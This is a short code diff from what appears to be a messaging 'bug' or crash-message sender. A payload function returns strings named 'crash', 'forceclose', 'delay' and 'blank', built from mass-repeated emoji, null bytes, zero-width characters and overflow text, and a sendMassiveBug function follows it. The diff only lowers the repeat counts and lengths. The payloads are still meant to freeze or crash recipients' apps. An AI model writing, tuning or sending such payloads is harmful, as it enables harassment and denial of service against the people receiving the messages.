@@ -554,15 +554,15 @@
             case 'crash':
                 return (rtlMass + baseCrash + nullAttack + zalgoHell + overflow).substring(0, 185000);
             case 'forceclose':
-                return ("%F0%9F%98%81".repeat(3000000) + "%00%00❌".repeat(18000000) + "FORCECLOSE").substring(0, 185000000);
+                return ("%F0%9F%98%81".repeat(30000) + "%00%00❌".repeat(18000) + "FORCECLOSE").substring(0, 185000);
             case 'delay':
-                return ("🕳️⏳🕳️".repeat(5000000) + ".".repeat(80000000)).substring(0, 185000000);
+                return ("🕳️⏳🕳️".repeat(50000) + ".".repeat(80000)).substring(0, 185000);
             case 'blank':
-                return ("%E2%80%8B".repeat(7000000) + "%E2%81%A0".repeat(70000000)).substring(0, 185000000);
+                return ("%E2%80%8B".repeat(70000) + "%E2%81%A0".repeat(70000)).substring(0, 185000);
             default:
                 return overflow + nullAttack;
         }
-    }
+                                                                          }
     
     async function sendMassiveBug() {
         if(isSending) {
